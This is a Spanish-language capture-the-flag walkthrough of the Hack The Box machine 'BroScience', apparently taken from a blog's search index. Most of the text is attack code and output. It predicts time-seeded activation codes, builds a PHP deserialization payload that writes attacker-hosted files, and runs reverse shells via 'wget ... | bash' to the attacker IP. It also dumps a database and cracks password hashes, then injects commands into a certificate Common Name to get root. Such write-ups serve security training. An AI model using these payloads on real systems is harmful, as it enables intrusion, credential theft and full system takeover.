\u0026lt;/html\u0026gt; Activate, es el encargado de obtener un codigo de activacion, de ser correcto, activa al usuario con ese codigo. De no ser valido, muestra un mensaje de error, tal y como se muestra en la imagen.\nactivate.php\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 // activate.php \u0026lt;?php session_start(); // Check if user is logged in already if (isset($_SESSION[\u0026#39;id\u0026#39;])) { header(\u0026#39;Location: /index.php\u0026#39;); } if (isset($_GET[\u0026#39;code\u0026#39;])) { // Check if code is formatted correctly (regex) if (preg_match(\u0026#39;/^[A-z0-9]{32}$/\u0026#39;, $_GET[\u0026#39;code\u0026#39;])) { // Check for code in database include_once \u0026#39;includes/db_connect.php\u0026#39;; $res = pg_prepare($db_conn, \u0026#34;check_code_query\u0026#34;, \u0026#39;SELECT id, is_activated::int FROM users WHERE activation_code=$1\u0026#39;); $res = pg_execute($db_conn, \u0026#34;check_code_query\u0026#34;, array($_GET[\u0026#39;code\u0026#39;])); if (pg_num_rows($res) == 1) { // Check if account already activated $row = pg_fetch_row($res); if (!(bool)$row[1]) { // Activate account $res = pg_prepare($db_conn, \u0026#34;activate_account_query\u0026#34;, \u0026#39;UPDATE users SET is_activated=TRUE WHERE id=$1\u0026#39;); $res = pg_execute($db_conn, \u0026#34;activate_account_query\u0026#34;, array($row[0])); $alert = \u0026#34;Account activated!\u0026#34;; $alert_type = \u0026#34;success\u0026#34;; } else { $alert = \u0026#39;Account already activated.\u0026#39;; } } else { $alert = \u0026#34;Invalid activation code.\u0026#34;; } } else { $alert = \u0026#34;Invalid activation code.\u0026#34;; } } else { $alert = \u0026#34;Missing activation code.\u0026#34;; } ?\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;BroScience : Activate account\u0026lt;/title\u0026gt; \u0026lt;?php include_once \u0026#39;includes/header.php\u0026#39;; ?\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;?php include_once \u0026#39;includes/navbar.php\u0026#39;; ?\u0026gt; \u0026lt;div class=\u0026#34;uk-container uk-container-xsmall\u0026#34;\u0026gt; \u0026lt;?php // Display any alerts if (isset($alert)) { ?\u0026gt; \u0026lt;div uk-alert class=\u0026#34;uk-alert-\u0026lt;?php if(isset($alert_type)){echo $alert_type;}else{echo \u0026#39;danger\u0026#39;;} ?\u0026gt;\u0026#34;\u0026gt; \u0026lt;a class=\u0026#34;uk-alert-close\u0026#34; uk-close\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;?=$alert?\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;?php } ?\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; En utils encontramos distintas funciones y clases:\nfunciones generate_activation_code rel_time get_theme get_theme_class set_theme clases UserPrefs Avatar AvatarInterface utils.php\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 \u0026lt;?php function generate_activation_code() { $chars = \u0026#34;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890\u0026#34;; srand(time()); $activation_code = \u0026#34;\u0026#34;; for ($i = 0; $i \u0026lt; 32; $i++) { $activation_code = $activation_code . $chars[rand(0, strlen($chars) - 1)]; } return $activation_code; } // Source: https://stackoverflow.com/a/4420773 (Slightly adapted) function rel_time($from, $to = null) { $to = (($to === null) ? (time()) : ($to)); $to = ((is_int($to)) ? ($to) : (strtotime($to))); $from = ((is_int($from)) ? ($from) : (strtotime($from))); $units = array ( \u0026#34;year\u0026#34; =\u0026gt; 29030400, // seconds in a year (12 months) \u0026#34;month\u0026#34; =\u0026gt; 2419200, // seconds in a month (4 weeks) \u0026#34;week\u0026#34; =\u0026gt; 604800, // seconds in a week (7 days) \u0026#34;day\u0026#34; =\u0026gt; 86400, // seconds in a day (24 hours) \u0026#34;hour\u0026#34; =\u0026gt; 3600, // seconds in an hour (60 minutes) \u0026#34;minute\u0026#34; =\u0026gt; 60, // seconds in a minute (60 seconds) \u0026#34;second\u0026#34; =\u0026gt; 1 // 1 second ); $diff = abs($from - $to); if ($diff \u0026lt; 1) { return \u0026#34;Just now\u0026#34;; } $suffix = (($from \u0026gt; $to) ? (\u0026#34;from now\u0026#34;) : (\u0026#34;ago\u0026#34;)); $unitCount = 0; $output = \u0026#34;\u0026#34;; foreach($units as $unit =\u0026gt; $mult) if($diff \u0026gt;= $mult \u0026amp;\u0026amp; $unitCount \u0026lt; 1) { $unitCount += 1; // $and = (($mult != 1) ? (\u0026#34;\u0026#34;) : (\u0026#34;and \u0026#34;)); $and = \u0026#34;\u0026#34;; $output .= \u0026#34;, \u0026#34;.$and.intval($diff / $mult).\u0026#34; \u0026#34;.$unit.((intval($diff / $mult) == 1) ? (\u0026#34;\u0026#34;) : (\u0026#34;s\u0026#34;)); $diff -= intval($diff / $mult) * $mult; } $output .= \u0026#34; \u0026#34;.$suffix; $output = substr($output, strlen(\u0026#34;, \u0026#34;)); return $output; } class UserPrefs { public $theme; public function __construct($theme = \u0026#34;light\u0026#34;) { $this-\u0026gt;theme = $theme; } } function get_theme() { if (isset($_SESSION[\u0026#39;id\u0026#39;])) { if (!isset($_COOKIE[\u0026#39;user-prefs\u0026#39;])) { $up_cookie = base64_encode(serialize(new UserPrefs())); setcookie(\u0026#39;user-prefs\u0026#39;, $up_cookie); } else { $up_cookie = $_COOKIE[\u0026#39;user-prefs\u0026#39;]; } $up = unserialize(base64_decode($up_cookie)); return $up-\u0026gt;theme; } else { return \u0026#34;light\u0026#34;; } } function get_theme_class($theme = null) { if (!isset($theme)) { $theme = get_theme(); } if (strcmp($theme, \u0026#34;light\u0026#34;)) { return \u0026#34;uk-light\u0026#34;; } else { return \u0026#34;uk-dark\u0026#34;; } } function set_theme($val) { if (isset($_SESSION[\u0026#39;id\u0026#39;])) { setcookie(\u0026#39;user-prefs\u0026#39;,base64_encode(serialize(new UserPrefs($val)))); } } class Avatar { public $imgPath; public function __construct($imgPath) { $this-\u0026gt;imgPath = $imgPath; } public function save($tmp) { $f = fopen($this-\u0026gt;imgPath, \u0026#34;w\u0026#34;); fwrite($f, file_get_contents($tmp)); fclose($f); } } class AvatarInterface { public $tmp; public $imgPath; public function __wakeup() { $a = new Avatar($this-\u0026gt;imgPath); $a-\u0026gt;save($this-\u0026gt;tmp); } } ?\u0026gt; Activation_Code Vemos que la funcion para el codigo de activacion, utiliza caracteres y digitos, el codigo de activacion tiene una longitud de 32 caracteres.\nLa funcion srand() toma como valor un entero, en este caso el valor de time(), en el ciclo for utiliza rand() para obtener un caracter \u0026ldquo;random\u0026rdquo;, el ciclo termina hasta crear una string de 32 caracteres y retornarlo.\nComo se observa en la ejecucion, el codigo de activacion es diferente segun el valor de time(), sabiendo la hora exacta de la ejecucion de la funcion es posible generar el codigo de activacion.\nDeserialization \u0026amp; Serialization En las funciones set_theme() y get_theme() encontramos que utiliza las funciones de serialize() y unserialize().\nEn la primera establece una nueva cookie (en el caso de que el usuario este logeado) en base64 serializando un objeto de la clase UserPrefs(). En el segundo caso es similar, si observamos en la condicional verifica que no exista una cookie, en caso contrario, toma esta y la deserializa obteniendo el valor del tema. En este ultimo caso es posible manipular la cookie y pasar un objeto serializado modificado.\nPor ultimo tenemos las clases Avatar y AvatarInterface, las cuales permiten guardar un archivo en una direccion dada, con el uso de file_get_contents() es posible pasar una direccion URL. Tambien vemos la \u0026ldquo;magic function\u0026rdquo; __wakeup la cual se ejecuta cada vez que un objeto es deserializado, en este caso ejecuta la funcion save() para guardar un archivo.\nCon lo anterior, es posible manipular una cookie que es deserializada y, con los objetos Avatar y AvatarInterface crear un archivo, al juntar estos dos nos permitiria realizar \u0026ldquo;deserialization attack\u0026rdquo;.\nUser - www-data Como sabemos durante la ceracion de un usuario es necesario activar la cuenta, pero el codigo de activacion nunca se nos muestra o envia. Para generar nuestro codigo es necesario sincronizar la hora de nuestra maquina con la del servidor.\nClock synchro Creamos un script en python el cual obtiene la fecha de la maquina a partir de una solicitud GET al servidor, cambiamos la fecha de nuestra maquina con la fecha de la respuesta de la solicitud.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 import requests, subprocess, urllib3 from datetime import datetime from dateutil.parser import parse as parsedate urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) r = requests.get(\u0026#39;https://10.10.11.195\u0026#39;,verify=False) new_date = parsedate(r.headers[\u0026#34;Date\u0026#34;]).strftime(\u0026#34;%Y/%m/%d %H:%M:%S\u0026#34;) print(\u0026#34;Site date:\u0026#34;, new_date) print(\u0026#34;Current date:\u0026#34;, datetime.now().strftime(\u0026#34;%Y/%m/%d %H:%M:%S\u0026#34;)) subprocess.Popen([\u0026#39;sudo\u0026#39;,\u0026#39;/usr/bin/date\u0026#39;, \u0026#39;-s\u0026#39;, f\u0026#39;{new_date}\u0026#39;], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE) print(\u0026#34;New Date: \u0026#34;, datetime.now().strftime(\u0026#34;%Y/%m/%d %H:%M:%S\u0026#34;)) Nota: tomar en cuenta la zona horaria del servidor: sudo timedatectl set-timezone GMT\nActivation code Utilizamos la misma funcion para generar una lista de codigos, con un segundo de intervalo.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 \u0026lt;?php function generate_activation_code() { $chars = \u0026#34;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890\u0026#34;; srand(time()); $activation_code = \u0026#34;\u0026#34;; for ($i = 0; $i \u0026lt; 32; $i++) { $activation_code = $activation_code . $chars[rand(0, strlen($chars) - 1)]; } return $activation_code; } //echo \u0026#34;\\n\u0026#34;; for($i =0; $i \u0026lt; 2000; $i++){ sleep(1); echo generate_activation_code() . \u0026#34;\\n\u0026#34;; } User Auth Creamos un usuario, y, durante el proceso ejecutamos el archivo anterior creando un wordlist de codigos. Vemos que el usuario bob se creo.\nVemos la creacion de los codigos, al finalizar la creacion del usuario cancelamos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 ┌─[✗]─[kirby@parrot]─[~/htb/broscience] └──╼ $php code.php 2023-02-17 23-04-11:000000 : 8d0Uahz3sn5vwo6knP90mE5z6khCrMQl 2023-02-17 23-04-12:000000 : QQXXPxDx8A4VGS8AqYHdMh6fFdDXtt6X 2023-02-17 23-04-13:000000 : RLGiSd8AHtcnExYx6ejXPqIfecuFpxjo 2023-02-17 23-04-14:000000 : mzblJRICzcIbJ0uKPhDUUPQTxLF1TUgW 2023-02-17 23-04-15:000000 : rtDa7oInQtZmGNsrYxUjyvMzKnwXXRRa 2023-02-17 23-04-16:000000 : HAs3SBxamBSD6jmTQxu7vdthRCPsspKg 2023-02-17 23-04-17:000000 : xNRonvn3K6e0zi6f02P02iQ3p4pKGHCk 2023-02-17 23-04-18:000000 : sS1Czn1YuRKXQP4vof8PRl9FF9F2BvVm 2023-02-17 23-04-19:000000 : fUe8bBcEBFHV17uHMoZKiImMZ0nURnL6 2023-02-17 23-04-20:000000 : FyTM56WqhOrrtdrgUU90mbZiWgwlOMpN 2023-02-17 23-04-21:000000 : gO2nqz2BiGH5bJdklwPZ1dCpZMez6OrH ^C Intentamos con los codigos que generamos hasta encontrar el que active nuestra cuenta.\nIngresamos con las credenciales correctamente.\nDeserialization Attack Si observamos el valor actual de la cookie, representa el objeto UserPrefs().\n1 2 3 4 5 # Cookie user-prefs=Tzo5OiJVc2VyUHJlZnMiOjE6e3M6NToidGhlbWUiO3M6NDoiZGFyayI7fQ%3D%3D # Decodificado, Serializado O:9:\u0026#34;UserPrefs\u0026#34;:1:{s:5:\u0026#34;theme\u0026#34;;s:4:\u0026#34;dark\u0026#34;;} Utilizamos el codigo de la clase Avatar y AvatarInterface para serializar y codificar en base64. En este caso estariamos creando el archivo abc.php con el contenido de un archivo en un servidor http.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 \u0026lt;?php class Avatar { public $imgPath; public function __construct($imgPath) { $this-\u0026gt;imgPath = $imgPath; } public function save($tmp) { $f = fopen($this-\u0026gt;imgPath, \u0026#34;w\u0026#34;); fwrite($f, file_get_contents($tmp)); fclose($f); } } class AvatarInterface { public $tmp=\u0026#34;http://10.10.14.207/abc.php\u0026#34;; public $imgPath=\u0026#34;abc.php\u0026#34;; public function __wakeup() { $a = new Avatar($this-\u0026gt;imgPath); $a-\u0026gt;save($this-\u0026gt;tmp); } } echo base64_encode(serialize(new AvatarInterface())); El archivo contiene la ejecucion de echo con un mensaje.\n1 2 \u0026lt;?php echo \u0026#34;from hell to heaven\u0026#34;; Creamos un servidor HTTP con python para nuestro archivo abc.php.\n1 2 3 4 5 6 7 ┌─[kirby@parrot]─[~/htb/broscience/www] └──╼ $cat abc.php \u0026lt;?php echo \u0026#34;from hell to heaven\u0026#34;; ┌─[kirby@parrot]─[~/htb/broscience/www] └──╼ $ sudo python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... Luego generamos nuestro objeto serializado con la información necesaria para crear el archivo abc.php en la máquina.\nTras generar una nueva cookie y utilizarla en el sitio, obtuvimos una solicitud al archivo.\n1 2 3 4 5 6 7 ┌─[✗]─[kirby@parrot]─[~/htb/broscience/www] └──╼ $sudo python3 -m http.server 80 [sudo] password for kirby: Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... 10.10.11.195 - - [17/Feb/2023 23:33:50] \u0026#34;GET /abc.php HTTP/1.0\u0026#34; 200 - 10.10.11.195 - - [17/Feb/2023 23:33:50] \u0026#34;GET /abc.php HTTP/1.0\u0026#34; 200 - 10.10.11.195 - - [17/Feb/2023 23:33:50] \u0026#34;GET /abc.php HTTP/1.0\u0026#34; 200 - Observamos que nuestro archivo PHP se creo y ejecutó correctamente.\n1 2 3 4 5 ┌─[kirby@parrot]─[~/htb/broscience/www] └──╼ $curl -sk https://broscience.htb/abc.php \u0026amp;\u0026amp; echo from hell to heaven ┌─[kirby@parrot]─[~/htb/broscience/www] └──╼ $ Shell Generamos nuevamente una cookie esta vez con la ejecucion de una shell inversa.\nNuestro archivo shell con el siguiente comando, al mismo tiempo ejecutamos shells.\n1 2 3 \u0026lt;?php $cmd = shell_exec(\u0026#34;ls -lah \u0026amp;\u0026amp; wget -qO- http://10.10.14.207:8081/10.10.14.207:1335|bash\u0026#34;); echo $cmd; Logrando obtener una shell como www-data.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 ┌─[kirby@parrot]─[~/htb/broscience/www] └──╼ $rlwrap nc -lvp 1335 listening on [any] 1335 ... connect to [10.10.14.207] from broscience.htb [10.10.11.195] 48496 /bin/sh: 0: can\u0026#39;t access tty; job control turned off $ which python $ which python3 /usr/bin/python3 $ python3 -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;);\u0026#39; www-data@broscience:/var/www/html$ whoami;id;pwd www-data uid=33(www-data) gid=33(www-data) groups=33(www-data) /var/www/html www-data@broscience:/var/www/html User - Bill Localmente utilizamos las credenciales de la conexion de base de datos, encontramos una lista de hashes de los usuarios registrados.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 www-data@broscience:/dev/shm$ psql -h localhost --username=dbuser -d broscience -W # RangeOfMotion%777 \u0026lt;sername=dbuser -d broscience -W # RangeOfMotion%777 Password: psql (13.9 (Debian 13.9-0+deb11u1)) SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off) Type \u0026#34;help\u0026#34; for help. broscience=\u0026gt; \\dt WARNING: terminal is not fully functional - (press RETURN) public | comments | table | postgres public | exercises | table | postgres public | users | table | postgres (END)q broscience=\u0026gt; \\d users WARNING: terminal is not fully functional - (press RETURN) id | integer | | not null | generated a lways as identity username | character varying(100) | | not null | password | character varying(100) | | not null | email | character varying(100) | | not null | activation_code | character varying(32) | | not null | is_activated | boolean | | | false is_admin | boolean | | | false date_created | timestamp with time zone | | | CURRENT_TIM ESTAMP q broscience=\u0026gt; broscience=\u0026gt; select * from users; WARNING: terminal is not fully functional - (press RETURN) 1 | administrator | 15657792073e8a843d4f91fc403454e1 | administrator@broscience.htb | OjYUyL9R4NpM9LOFP0T4Q4NUQ9PNpLHf | t | t | 2019-03-07 02:02:22.226763-05 2 | bill | 13edad4932da9dbb57d9cd15b66ed104 | bill@broscience.htb | WLHPyj7NDRx10BYHRJPPgnRAYlMPTkp4 | t | f | 2019-05-07 03:34:44.127644-04 3 | michael | bd3dad50e2d578ecba87d5fa15ca5f85 | michael@broscience.htb | zgXkcmKip9J5MwJjt8SZt5datKVri9n3 | t | f | 2020-10-01 04:12:34.732872-04 4 | john | a7eed23a7be6fe0d765197b1027453fe | john@broscience.htb | oGKsaSbjocXb3jwmnx5CmQLEjwZwESt6 | t | f | 2021-09-21 11:45:53.118482-04 5 | dmytro | 5d15340bded5b9395d5d14b9c21bc82b | dmytro@broscience.htb | 43p9iHX6cWjr9YhaUNtWxEBNtpneNMYm | t | f | 2021-08-13 10:34:36.226763-04 (END) (END) q broscience=\u0026gt; Hash Cracking - John Utilizamos el formato de John para crackear los hashes. En este caso dynamic_4 (Ref. 1 2), si observamos el hash md5 generado en el registro de usuarios (register.php).\n1 2 3 4 5 6 # md5($db_salt . $_POST[\u0026#39;password\u0026#39;]) administrator:15657792073e8a843d4f91fc403454e1$NaCl bill:13edad4932da9dbb57d9cd15b66ed104$NaCl michael:bd3dad50e2d578ecba87d5fa15ca5f85$NaCl john:a7eed23a7be6fe0d765197b1027453fe$NaCl dmytro:5d15340bded5b9395d5d14b9c21bc82b$NaCl Observamos que el formato este en la lista de formatos de john.\n1 2 3 4 5 6 7 8 9 10 11 12 ┌─[kirby@parrot]─[~/htb/broscience] └──╼ $john --list=subformats |grep md5 | head Format = dynamic_0 type = dynamic_0: md5($p) (raw-md5) Format = dynamic_1 type = dynamic_1: md5($p.$s) (joomla) Format = dynamic_2 type = dynamic_2: md5(md5($p)) (e107) Format = dynamic_3 type = dynamic_3: md5(md5(md5($p))) Format = dynamic_4 type = dynamic_4: md5($s.$p) (OSC) Format = dynamic_5 type = dynamic_5: md5($s.$p.$s) Format = dynamic_6 type = dynamic_6: md5(md5($p).$s) Format = dynamic_8 type = dynamic_8: md5(md5($s).$p) Format = dynamic_9 type = dynamic_9: md5($s.md5($p)) Format = dynamic_10 type = dynamic_10: md5($s.md5($s.$p)) Al ejecutar john sobre los hashes observamos tres en texto plano.\n1 2 3 4 5 6 7 8 9 10 11 12 13 ┌─[kirby@parrot]─[~/htb/broscience] └──╼ $john --format=dynamic_4 hashes --wordlist=/usr/share/wordlists/rockyou.txt Using default input encoding: UTF-8 Loaded 5 password hashes with no different salts (dynamic_4 [md5($s.$p) (OSC) 256/256 AVX2 8x3]) Remaining 4 password hashes with no different salts Warning: no OpenMP support for this hash type, consider --fork=4 Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status iluvhorsesandgym (bill) Aaronthehottest (dmytro) 2applesplus2apples (michael) 2g 0:00:00:01 DONE (2023-02-18 00:45) 1.626g/s 11659Kp/s 11659Kc/s 42910KC/s !!alex!!mil!!..*7¡Vamos! Use the \u0026#34;--show --format=dynamic_4\u0026#34; options to display all of the cracked passwords reliably Session completed Shell Utilizando las contraseñas ingresamos por SSH con el usuario bill, realizando la lectura de nuestra flag user.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 ┌─[kirby@parrot]─[~/htb/broscience] └──╼ $ssh bill@broscience.htb # iluvhorsesandgym bill@broscience.htb\u0026#39;s password: Linux broscience 5.10.0-20-amd64 #1 SMP Debian 5.10.158-2 (2022-12-13) x86_64 The programs included with the Debian GNU/Linux system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. Last login: Fri Feb 17 17:43:24 2023 from 10.10.14.89 bill@broscience:~$ ls Certs Desktop Documents Downloads Music Pictures Public Templates Videos user.txt bill@broscience:~$ cat user.txt bb7107c1c936442b4921ca3ce0fbf93f bill@broscience:~$ Privesc Tras ejecutar pspy observamos la ejecucion del script renew_cert.sh sobre un certificado con nombre broscience.crt, como root.\n1 2 3 4 5 6 7 8 2023/02/17 20:05:55 CMD: UID=117 PID=26800 | postgres: 13/main: autovacuum worker template1 2023/02/17 20:06:01 CMD: UID=0 PID=26801 | /usr/sbin/CRON -f 2023/02/17 20:06:01 CMD: UID=0 PID=26802 | /bin/sh -c /root/cron.sh 2023/02/17 20:06:01 CMD: UID=0 PID=26804 | timeout 10 /bin/bash -c /opt/renew_cert.sh /home/bill/Certs/broscience.crt 2023/02/17 20:06:01 CMD: UID=0 PID=26803 | /bin/bash /root/cron.sh 2023/02/17 20:06:01 CMD: UID=0 PID=26805 | /bin/bash /opt/renew_cert.sh /home/bill/Certs/broscience.crt 2023/02/17 20:06:15 CMD: UID=117 PID=26808 | postgres: 13/main: autovacuum worker broscience 2023/02/17 20:06:35 CMD: UID=117 PID=26809 | postgres: 13/main: autovacuum worker El script obtiene los atributos del certificado, en caso de expirar en las proximas 24 horas crea uno nuevo.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 #!/bin/bash if [ \u0026#34;$#\u0026#34; -ne 1 ] || [ $1 == \u0026#34;-h\u0026#34; ] || [ $1 == \u0026#34;--help\u0026#34; ] || [ $1 == \u0026#34;help\u0026#34; ]; then echo \u0026#34;Usage: $0 certificate.crt\u0026#34;; exit 0; fi if [ -f $1 ]; then openssl x509 -in $1 -noout -checkend 86400 \u0026gt; /dev/null if [ $? -eq 0 ]; then echo \u0026#34;No need to renew yet.\u0026#34;; exit 1; fi subject=$(openssl x509 -in $1 -noout -subject | cut -d \u0026#34;=\u0026#34; -f2-) country=$(echo $subject | grep -Eo \u0026#39;C = .{2}\u0026#39;) state=$(echo $subject | grep -Eo \u0026#39;ST = .*,\u0026#39;) locality=$(echo $subject | grep -Eo \u0026#39;L = .*,\u0026#39;) organization=$(echo $subject | grep -Eo \u0026#39;O = .*,\u0026#39;) organizationUnit=$(echo $subject | grep -Eo \u0026#39;OU = .*,\u0026#39;) commonName=$(echo $subject | grep -Eo \u0026#39;CN = .*,?\u0026#39;) emailAddress=$(openssl x509 -in $1 -noout -email) country=${country:4} state=$(echo ${state:5} | awk -F, \u0026#39;{print $1}\u0026#39;) locality=$(echo ${locality:3} | awk -F, \u0026#39;{print $1}\u0026#39;) organization=$(echo ${organization:4} | awk -F, \u0026#39;{print $1}\u0026#39;) organizationUnit=$(echo ${organizationUnit:5} | awk -F, \u0026#39;{print $1}\u0026#39;) commonName=$(echo ${commonName:5} | awk -F, \u0026#39;{print $1}\u0026#39;) echo $subject; echo \u0026#34;\u0026#34;; echo \u0026#34;Country =\u0026gt; $country\u0026#34;; echo \u0026#34;State =\u0026gt; $state\u0026#34;; echo \u0026#34;Locality =\u0026gt; $locality\u0026#34;; echo \u0026#34;Org Name =\u0026gt; $organization\u0026#34;; echo \u0026#34;Org Unit =\u0026gt; $organizationUnit\u0026#34;; echo \u0026#34;Common Name =\u0026gt; $commonName\u0026#34;; echo \u0026#34;Email =\u0026gt; $emailAddress\u0026#34;; echo -e \u0026#34;\\nGenerating certificate...\u0026#34;; openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout /tmp/temp.key -out /tmp/temp.crt -days 365 \u0026lt;\u0026lt;\u0026lt;\u0026#34;$country $state $locality $organization $organizationUnit $commonName $emailAddress \u0026#34; 2\u0026gt;/dev/null /bin/bash -c \u0026#34;mv /tmp/temp.crt /home/bill/Certs/$commonName.crt\u0026#34; else echo \u0026#34;File doesn\u0026#39;t exist\u0026#34; exit 1; Command Injection Si observamos, cuando se crea un nuevo certificado toma literal el valor de commonName del certificado, en este caso podriamos inyectar comandos para que se ejecuten.\n1 /bin/bash -c \u0026#34;mv /tmp/temp.crt /home/bill/Certs/$commonName.crt\u0026#34; Generamos un certificado ya expirado, utilizando el comando faketime (Ref. 1) donde agregamos un comando a ejecutar en el commo name.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 ┌─[kirby@parrot]─[~/htb/broscience/www] └──╼ $faketime \u0026#39;2008-12-24 08:15:42\u0026#39; openssl req -x509 -sha256 -nodes -days 1 -newkey rsa:2048 -keyout privateKey.key -out broscience.crt Generating a RSA private key ...........+++++ ...........................................................................................+++++ writing new private key to \u0026#39;privateKey.key\u0026#39; ----- You are about to be asked to enter information that will be incorporated into your certificate request. What you are about to enter is what is called a Distinguished Name or a DN. There are quite a few fields but you can leave some blank For some fields there will be a default value, If you enter \u0026#39;.\u0026#39;, the field will be left blank. ----- Country Name (2 letter code) [AU]:da State or Province Name (full name) [Some-State]:da Locality Name (eg, city) []:da Organization Name (eg, company) [Internet Widgits Pty Ltd]:fd Organizational Unit Name (eg, section) []:df Common Name (e.g. server FQDN or YOUR name) []:$(cat /root/root.txt \u0026gt;/tmp/root.txt) Email Address []:dafsdf Observamos el comando en el common name.\n1 2 3 ┌─[kirby@parrot]─[~/htb/broscience/www] └──╼ $openssl x509 -in broscience.crt -noout -subject subject=C = da, ST = da, L = da, O = fd, OU = df, CN = \u0026#34;$(cat /root/root.txt \u0026gt;/tmp/root.txt)\u0026#34;, emailAddress = dafsdf Tras esperar unos segundos observamos que se ejecuto nuestro comando.\n1 2 3 4 5 2023/02/17 20:58:02 CMD: UID=0 PID=27674 | /bin/bash /opt/renew_cert.sh /home/bill/Certs/broscience.crt 2023/02/17 20:58:02 CMD: UID=0 PID=27677 | openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout /tmp/temp.key -out /tmp/temp.crt -days 365 2023/02/17 20:58:04 CMD: UID=0 PID=27680 | /bin/bash -c mv /tmp/temp.crt /home/bill/Certs/\u0026#34;$(cat /root/root.txt \u0026gt;/tmp/root.txt)\u0026#34;.crt 2023/02/17 20:58:04 CMD: UID=0 PID=27679 | /bin/bash -c mv /tmp/temp.crt /home/bill/Certs/\u0026#34;$(cat /root/root.txt \u0026gt;/tmp/root.txt)\u0026#34;.crt 2023/02/17 20:58:04 CMD: UID=0 PID=27678 | /bin/bash -c mv /tmp/temp.crt /home/bill/Certs/\u0026#34;$(cat /root/root.txt \u0026gt;/tmp/root.txt)\u0026#34;.crt Vemos el archivo root.txt en el directorio /tmp.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 bill@broscience:~/Certs$ ls -lah /tmp/ total 3.9M drwxrwxrwt 18 root root 4.0K Feb 17 21:02 . drwxr-xr-x 19 root root 4.0K Jan 2 04:50 .. drwxrwxrwt 2 root root 4.0K Feb 17 15:22 .ICE-unix drwxrwxrwt 2 root root 4.0K Feb 17 15:22 .Test-unix [.. snip ..] -rwxr-xr-x 1 bill bill 3.0M Dec 26 17:21 pspy64 -rw-r--r-- 1 root root 33 Feb 17 21:02 root.txt drwx------ 3 root root 4.0K Feb 17 15:22 systemd-private-fce4cfc7c070458d89f20a1b40cfa57e-ModemManager.service-u6xz6g [.. snip ..] drwx------ 2 root root 4.0K Feb 17 15:23 vmware-root_549-4248811676 bill@broscience:~/Certs$ cat /tmp/root.txt 7de4c6b32d386c2c39d48dee2ddfefd bill@broscience:~/Certs$ Shell Creamos nuevamente un certificado, esta vez con la ejecucion de una shell inversa.\n1 $(wget -qO- http://10.10.14.207:8081/10.10.14.207:1335 | bash) Tras unos segundo obtuvimos una shell como root y nuevamente, la flag root.txt.\n1 2 3 4 5 6 7 8 9 10 11 ┌─[kirby@parrot]─[~/htb/broscience/www] └──╼ $rlwrap nc -lvp 1335 listening on [any] 1335 ... connect to [10.10.14.207] from broscience.htb [10.10.11.195] 57684 /bin/sh: 0: can\u0026#39;t access tty; job control turned off # python3 -c \u0026#39;import pty;pty.spawn(\u0026#34;/bin/bash\u0026#34;);\u0026#39; root@broscience:~# ls cron.sh dbreset.sh init.sql root.txt webapp webappreset.sh root@broscience:~# cat root.txt 7de4c6b32d386c2c39d48dee2ddfefd3 root@broscience:~# ","description":"BroScience expone un sitio web vulnerable por el cual realizamos la lectura de su codigo fuente, con ello registramos un usuario e identificamos una vulnerabilidad de 'Deserialization' que nos permitio la creacion y 'ejecucion' de archivos PHP para darnos acceso a la maquina. En la base de datos del sitio descubrimos hashes que nos permitieron acceder a un segundo usuario. Finalmente tras realizar 'Command Injection' en el Common Name de un certificado expirado que es utilizado por un script de un cronjob logramos escalar privilegios.","id":3,"section":"posts","tags":["dotdotpwn","directory traversal","php","deserialization","deserialization-attack","python","postgres","psql","john","openssl","faketime","command injection"],"title":"Hack The Box - BroScience","uri":"https://sckull.github.io/posts/broscience/"},{"content":"\rMentor expone el servicio snmp y una API la cual enumeramos, en esta ultima encontramos una vulnerabilidad de Command Injection la cual nos permitio acceder a un contenedor de docker. 